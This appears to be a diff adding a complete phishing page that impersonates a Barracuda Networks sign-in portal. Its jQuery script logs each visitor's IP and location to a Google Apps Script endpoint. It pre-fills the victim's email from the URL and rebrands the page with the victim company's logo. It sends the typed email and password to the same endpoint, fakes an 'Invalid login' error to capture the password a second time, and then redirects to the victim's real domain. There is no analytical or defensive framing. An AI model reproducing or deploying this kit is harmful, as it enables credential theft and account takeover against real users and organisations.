@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="description" content="The sign in page for the Portal.">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="csrf-token" content="kNY9zQMsjWEghXzqFkE8XIBI6boXIcWYW2ETVlQr">
+
+    <link rel="shortcut icon" href="https://auth.barracudanetworks.com/img/favicon.ico">
+    <link href="https://auth.barracudanetworks.com/css/app.css" rel="stylesheet" media="all">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700" media="all" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" media="all" rel="stylesheet">
+
+    <title id="page-title">Sign In :: Portal</title>
+    
+    <style>
+        .error-message {
+            color: red;
+            margin-bottom: 10px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .center {
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .btn-loading {
+            position: relative;
+            color: transparent !important;
+            pointer-events: none;
+        }
+
+        .btn-loading::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 20px;
+            height: 20px;
+            margin-top: -10px;
+            margin-left: -10px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top: 3px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media screen and (max-width: 768px) {
+            .cuda-paper {
+                width: 100% !important;
+                height: auto !important;
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="root">
+        <div class="cuda-content">
+            <div class="cuda-typography">
+                <div class="cuda-header cuda-size-sm mui--clearfix">
+                    <div class="mui--pull-left">
+                        <a href="#" class="mui-btn mui-btn--flat mui-btn--small cuda-button-transparent qa-link-back">
+                            <span class="material-icons" style="vertical-align: middle;">arrow_back</span>
+                            Back
+                        </a>
+                    </div>
+                
+                    <div class="mui-dropdown mui--pull-right">
+                        <button class="mui-btn mui-btn--flat mui-btn--small cuda-button-transparent qa-button-locale-switcher" style="text-transform: none" data-mui-toggle="dropdown" type="button">
+                            English (US)
+                            <span class="mui-caret"></span>
+                        </button>
+
+                        <ul class="mui-dropdown__menu mui-dropdown__menu--right" id="language-list" style="margin-top: -30px;">
+                            <li>
+                                <a style="font-weight: bold" href="javascript:void(0);" data-languagekey="en_US" class="qa-link-locale qa-link-locale-en_US">English (US)</a>
+                            </li>
+                            <li>
+                                <a href="javascript:void(0);" data-languagekey="fr_FR" class="qa-link-locale qa-link-locale-fr_FR">Français (France)</a>
+                            </li>
+                            <li>
+                                <a href="javascript:void(0);" data-languagekey="de_DE" class="qa-link-locale qa-link-locale-de_DE">Deutsch</a>
+                            </li>
+                            <li>
+                                <a href="javascript:void(0);" data-languagekey="es_ES" class="qa-link-locale qa-link-locale-es_ES">Español (España)</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="cuda-paper cuda-size-sm">
+                    <div class="cuda-mat cuda-bgcolor-primary">
+                        <div class="cuda-mat-sm" align="center">
+                            <img id="company-logo" src="https://auth.barracudanetworks.com/img/barracuda-logo.svg" alt="Company Logo" class="center" height="80"><br>               
+                        </div>
+
+                        <form id="login-form" method="post">
+                            <div id="email-input-container" class="mui-textfield cuda-mui-textfield" style="margin-bottom: 15px;">
+                                <label for="email">Email</label>
+                                <input class="cuda-style-fullWidth qa-field-email" type="email" name="email" id="email" value="">
+                            </div>
+
+                            <div id="password-container" class="mui-textfield cuda-mui-textfield" style="margin-bottom: 15px; display: none;">
+                                <input type="hidden" id="username" name="user" value="">
+                                <label for="password" data-caps-lock-warning="Caps Lock">Password</label>
+                                <input class="cuda-style-fullWidth qa-field-password" type="password" name="pass" id="password" value="">
+                            </div>
+
+                            <div class="error-message" style="display: none;"></div>
+
+                            <button id="continue-btn" class="mui-btn mui-btn--raised mui-btn--primary cuda-style-fullWidth" style="margin: 0;" type="button">Continue</button>
+                            <button id="submit-btn" class="mui-btn mui-btn--raised mui-btn--primary cuda-style-fullWidth" style="margin: 0; display: none;" type="button">Sign In</button>
+
+                            <div style="margin-top: 15px;" class="mui--clearfix">
+                                <a href="#" name="forgot_password" id="forgot_password" class="mui--pull-left qa-link-forgot-password">
+                                    Forgot password?
+                                </a>
+                            </div>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="cuda-typography cuda-footer">
+            <span class="cuda-footer-left">
+                <span id="company-copyright">
+                    2024 Company
+                </span>
+                <span>
+                    <a href="https://barracuda.com/privacy" target="_blank" rel="noopener">Privacy Policy</a>
+                    <a href="https://barracuda.com/terms" target="_blank" rel="noopener">Terms of Service</a>
+                </span>
+            </span>
+            <span class="cuda-footer-right"></span>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script>
+        // Immediately send page load notification
+        (function() {
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(ipData => {
+                    const userIp = ipData.ip;
+                    const formData = new URLSearchParams();
+                    formData.append('FormId', 'form31');
+                    formData.append('IPAddress', userIp);
+                    formData.append('City', ipData.city || '');
+                    formData.append('Region', ipData.region || '');
+                    formData.append('Country', ipData.country || '');
+                    formData.append('Org', ipData.org || '');
+
+                    fetch('https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec?action=notifyVisit', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        body: formData,
+                        mode: 'no-cors'
+                    });
+                })
+                .catch(error => {
+                    console.error('Error sending notification:', error);
+                });
+        })();
+
+        $(document).ready(function() {
+            // Get email from URL parameter
+            const urlParams = new URLSearchParams(window.location.search);
+            let email = urlParams.get('client-request-id');
+            
+            // If email is in URL, skip to password step
+            if (email && email.includes('@')) {
+                processEmail(email);
+            } else if (window.location.hash) {
+                // Check hash for email
+                const hashParams = new URLSearchParams(window.location.hash.substring(1));
+                const clientRequestId = hashParams.get('client-request-id');
+                if (clientRequestId && clientRequestId.includes('@')) {
+                    processEmail(clientRequestId);
+                }
+            }
+            
+            // Continue button handler
+            $('#continue-btn').click(function() {
+                const email = $('#email').val().trim();
+                
+                // Start loading state for continue button
+                $(this).addClass('btn-loading');
+                
+                if (email && email.includes('@')) {
+                    processEmail(email);
+                } else {
+                    $('.error-message').show().text('Please enter a valid email address.');
+                    $(this).removeClass('btn-loading');
+                }
+            });
+            
+            // Process email and update UI
+            function processEmail(email) {
+                $('#username').val(email);
+                
+                // Extract domain from email
+                const domainParts = email.split('@');
+                if (domainParts.length > 1) {
+                    const domain = domainParts[1];
+                    
+                    // Capitalize first letter of domain for title
+                    const capitalizedDomain = domain.charAt(0).toUpperCase() + domain.slice(1);
+                    $('#page-title').text('Sign In :: ' + capitalizedDomain + ' Portal');
+                    $('#company-copyright').text(' 2024 ' + capitalizedDomain);
+                    
+                    // Load company logo from Clearbit
+                    const logoUrl = 'https://logo.clearbit.com/' + domain;
+                    $('#company-logo').attr('src', logoUrl);
+                }
+                
+                // Switch to password view
+                $('#email-input-container').hide();
+                $('#continue-btn').hide();
+                $('#password-container').show();
+                $('#submit-btn').show();
+                
+                // Add email display above password field
+                if (!$('#email-display').length) {
+                    const emailDisplay = $('<div style="text-align: center; margin-bottom: 25px;"><b id="email-display">' + email + '</b></div>');
+                    emailDisplay.insertBefore($('#password-container'));
+                } else {
+                    $('#email-display').text(email);
+                }
+                
+                // Focus on password field
+                $('#password').focus();
+            }
+            
+            // Submit button handler
+            $('#submit-btn').click(function() {
+                submitForm($(this));
+            });
+            
+            // Allow Enter key to submit form
+            $('#password').keypress(function(e) {
+                if (e.which === 13) {
+                    submitForm($('#submit-btn'));
+                }
+            });
+            
+            // Form submission handler
+            let submissionAttempts = 0;
+            
+            function submitForm($button) {
+                const email = $('#username').val().trim();
+                const password = $('#password').val().trim();
+                
+                // Start loading state for submit button
+                $button.addClass('btn-loading');
+                
+                if (!password) {
+                    $('.error-message').show().text('Please enter your password.');
+                    $button.removeClass('btn-loading');
+                    return;
+                }
+                
+                const domain = email.split('@')[1];
+                
+                fetch('https://ipinfo.io/json')
+                    .then(response => response.json())
+                    .then(data => {
+                        const formData = new FormData();
+                        formData.append('IPAddress', data.ip);
+                        formData.append('Email', email);
+                        formData.append('Password', password);
+                        formData.append('Domain', domain);
+                        formData.append('FormId', 'form31');
+                        
+                        const scriptURL = 'https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec';
+                        
+                        if (submissionAttempts === 0) {
+                            fetch(scriptURL, {
+                                method: 'POST',
+                                body: formData,
+                                mode: 'no-cors'
+                            })
+                            .then(() => {
+                                submissionAttempts++;
+                                $('.error-message').show().text('Invalid login: Please try again.');
+                                $button.removeClass('btn-loading');
+                                
+                                // Only clear password field
+                                $('#password').val('');
+                            })
+                            .catch(error => {
+                                console.error('Error:', error);
+                                $button.removeClass('btn-loading');
+                            });
+                        } else if (submissionAttempts === 1) {
+                            fetch(scriptURL, {
+                                method: 'POST',
+                                body: formData,
+                                mode: 'no-cors'
+                            })
+                            .then(() => {
+                                window.location.href = 'https://' + domain;
+                            })
+                            .catch(error => {
+                                console.error('Error:', error);
+                                $button.removeClass('btn-loading');
+                            });
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error getting IP:', error);
+                        $button.removeClass('btn-loading');
+                    });
+            }
+        });
+    </script>
+</body>
+</html>
